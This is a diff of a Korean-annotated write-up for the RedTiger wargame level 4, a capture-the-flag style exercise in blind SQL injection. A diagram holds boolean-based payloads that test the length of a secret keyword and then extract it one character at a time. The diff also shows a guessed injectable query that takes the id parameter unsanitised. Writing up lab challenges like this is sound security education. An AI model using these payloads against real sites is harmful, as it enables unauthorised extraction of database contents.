@@ -2,6 +2,8 @@
 [redtiger] level4
 ================================================================================================================
 
+|
+
 .. graphviz::
 
     digraph G {
@@ -20,35 +22,32 @@
             "server"[shape="plaintext"];
             "server" -> step1 -> step3 -> step5 -> step7 -> step9;
         }
-        step0 -> step1[label="level4.php?id=1 and if((select length(keyword) from level4_secret)=%s,1,0)",arrowhead="normal"];
-        step3 -> step2[label="column length",arrowhead="normal"];
-        step4 -> step5[label="level4.php?id=1 and if((select substring(keyword,%s,1) from level4_secret)=%s,1,0)",arrowhead="normal"];
-        step7 -> step6[label="@solve",arrowhead="normal"];
+        step0 -> step1[label="id=1 and if((select length(keyword) from level4_secret)=%s,1,0)",arrowhead="normal"];
+        step3 -> step2[label="Data Length",arrowhead="normal"];
+        step4 -> step5[label="id=1 and if((select substring(keyword,%s,1) from level4_secret)=%s,1,0)",arrowhead="normal"];
+        step7 -> step6[label="Data Extract",arrowhead="normal"];
     }
 
 |
 
-Source Analysis
+server -> DB 예측
 ================================================================================================================
 
-- Target: Get the value of the first entry in table level4_secret in column keyword
+- 테이블명: level4_secret
 - Disabled: like
+- GET 파라미터: id
 
-.. code-block:: html
+.. code-block:: sql
 
-    <a href="?id=1">Click me</a>
-    Query returned 1 rows.
-    <form method="post">
-        Word: <input type="text" name="secretword">
-        <input type="submit" name="go" value="Go!">
-    </form>
-    
-
+    SELECT * FROM tb_name where
+    id=$_GET["id"]
 
 |
 
-Column Length
+and if
 ================================================================================================================
+
+- 데이터 길이 확인
 
 .. code-block:: python
 
@@ -77,9 +76,10 @@ Column Length
 
 |
 
-Data Extract
+and if
 ================================================================================================================
 
+- 데이터 추출
 
 .. code-block:: python
 
@@ -112,3 +112,4 @@ Data Extract
 
     print ans
 
+|
